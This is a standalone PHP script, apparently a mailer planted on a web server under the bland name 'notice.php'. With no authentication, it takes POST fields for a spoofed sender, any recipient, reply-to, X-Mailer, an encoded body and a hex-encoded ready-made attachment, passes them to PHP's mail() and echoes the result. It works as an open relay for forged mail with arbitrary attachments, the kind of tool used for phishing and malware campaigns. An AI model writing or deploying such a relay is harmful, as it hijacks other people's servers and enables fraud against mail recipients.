<form enctype="multipart/form-data" action="notice.php" method="post">
 <input type="hidden" name="MAX_FILE_SIZE" value="10000000" />
 file send: <input name="userfile" type="file" />
 <input type="submit" value="send" />
</form>
<?php
error_reporting(E_ALL);
function debug_report($str)
{
	if (isset($_GET['debug']))	
	{
		$fp = fopen("debug_log.txt", "a+");
		fwrite($fp,$str . "\r\n");
		fclose($fp);
	}
	return true;
}
function SendMail($Sender, $ToEmail, $Subject, $MailBody, $AttachmentFile, $boundary, $XMailer, $msgid_domain, $reply="", $IsHtml = true, $TransEncoding="Base64")
{
	$msg_id = strtoupper(md5(sha1(microtime())));
	$seed = substr($msg_id, 0, 16);
	$_full_boundary = $boundary . substr(base64_encode($seed), 0, -2);
	
	$header = "From: " . $Sender . "\r\n";
	if($reply != "")
		$header .= 'Reply-To: '.$reply. "\r\n";
	
	$header .= "Mime-Version: 1.0\r\n";
	if (strlen($XMailer) > 0)	$header .= "X-Mailer: ".$XMailer." \r\n";
	$header .= "Message-ID: <".$msg_id."@".$XMailer.">\r\n";
	$header .= "Content-Type: multipart/mixed; boundary=\"$_full_boundary\"\r\n";
	$msg = "--".$_full_boundary."\r\n";
	$body_charset = "UTF-8";
	if($IsHtml)
		$msg .= "Content-Type: text/html; charset=\"$body_charset\"\r\n";
	else
		$msg .= "Content-Type: text/plain; charset=\"$body_charset\"\r\n";
	
	$enc_message = "";
	switch ($TransEncoding)
	{
		case "Base64":
			$enc_message = chunk_split(base64_encode($MailBody));
			$msg .= "Content-Transfer-Encoding: base64\r\n\r\n\r\n";
			$msg .= $enc_message."\r\n\r\n";
			break;
		case "Quoted-Printable":
			$enc_message = quoted_printable_encode($MailBody);
			$msg .= "Content-Transfer-Encoding: Quoted-Printable\r\n\r\n\r\n";
			$msg .= $enc_message."\r\n\r\n";
			break;
		case "8bit":
			$msg .= "Content-Transfer-Encoding: 8bit\r\n\r\n\r\n";
			$enc_message = $MailBody;
			$msg .= $enc_message."\r\n\r\n";
			break;
		default:
			$msg .= "Content-Transfer-Encoding: 7bit\r\n\r\n\r\n";
			$enc_message = $MailBody;
			$msg .= $enc_message."\r\n\r\n";
	}
	
	
	$AttachStr .= "--".$_full_boundary."--\r\n";
	
	if($AttachmentFile != "")
	{
		$startIndex = strpos($AttachmentFile, "boundary=\"", 0);
		
		//debug_report("startIndex : " . strval($startIndex)."\r\n");
		
		if($startIndex >= 0)
		{
			$endIndex = strpos($AttachmentFile, "\"", $startIndex + strlen("boundary=\""));
			$patternBound = substr($AttachmentFile, $startIndex + strlen("boundary=\""), $endIndex - $startIndex - strlen("boundary=\""));
			
			//debug_report("patternBound : " . $patternBound."\r\n");
			$nFirstReturn = strpos($AttachmentFile, "\n", 0);
			
			$AttachStr = substr($AttachmentFile, $nFirstReturn + 1, strlen($AttachmentFile) - $nFirstReturn - 1);
			
			//debug_report("AttachStr : " . $AttachStr."\r\n");
			$cnt = 0;
			$AttachStr = str_replace($patternBound, $_full_boundary, $AttachStr, $cnt);
			
			$nFirstReturn = strpos($AttachStr, "\n", 0);			
			$AttachStr = substr($AttachStr, $nFirstReturn + 1, strlen($AttachStr) - $nFirstReturn - 1);
			
			//debug_report("AttachStr111 : " . $AttachStr."\r\n");
			
			
		}
		
		debug_report("ToEmail : " . $ToEmail);
		debug_report("Subject : " . $Subject);
		debug_report("Headers : \r\n" . $header);
		debug_report("===========================	msg		========================\r\n" . $msg);
		debug_report("==============================================================\r\n");
	}

	$msg .= $AttachStr;
	$ret = @mail($ToEmail, $Subject, $msg, $header);
	debug_report("return message : " . $ret);
	return $ret;
}
	
	debug_report("===========================	start		========================\r\n");
	$_Sender = "";
	$_ToAddr = "";
	$_subject = "";
	$_boundary = "";
	$_mailbody = "";
	$_attach = "";
	$_xmailer = "";
	$_msgid_domain = "";
	$_TrEncode = "";
	$_IsHtml = false;
	$reply = "";
	if(!isset($_POST['toaddr']))		exit(0);
	foreach($_POST as $variable => $element) 
	{
		$value = rawurldecode($element);
		if($variable=="sender")				$_Sender=$value;
		if($variable=="toaddr")				$_ToAddr=$value;
		if($variable=="subject")			$_subject=$value;
		if($variable=="boundary")			$_boundary=$value;
		if($variable=="msg")				$_mailbody=base64_decode($value);
		if($variable=="reply")
		{
			$reply = $value;
		}
		if($variable=="attach")
		{
			//debug_report($value."\r\n");
			//$_attach = hex2bin($value);
			
			$byteArray = pack("H*", $value);

			//debug_report("hex2bin success\r\n");
			
			$tmp = "";
			for($ii = 0 ; $ii < strlen($byteArray) ; $ii ++)
			{
				$tmp = $tmp.strval($byteArray[$ii]);
			}
			
			//debug_report($tmp."\r\n");
			
			$_attach = $tmp;
			
			//debug_report($_attach."\r\n");
		}
		
		if($variable=="xmailer")			$_xmailer=$value;
		if($variable=="msgdomain")			$_msgid_domain=$value;
		if($variable=="TrEncode")			$_TrEncode=$value;
		if($variable=="htmlstyle")			$_IsHtml=true;
		
	};
	$ret = SendMail($_Sender, $_ToAddr, $_subject, $_mailbody, $_attach, $_boundary, $_xmailer, $_msgid_domain, $reply, $_IsHtml, $_TrEncode);
	echo $ret;
?>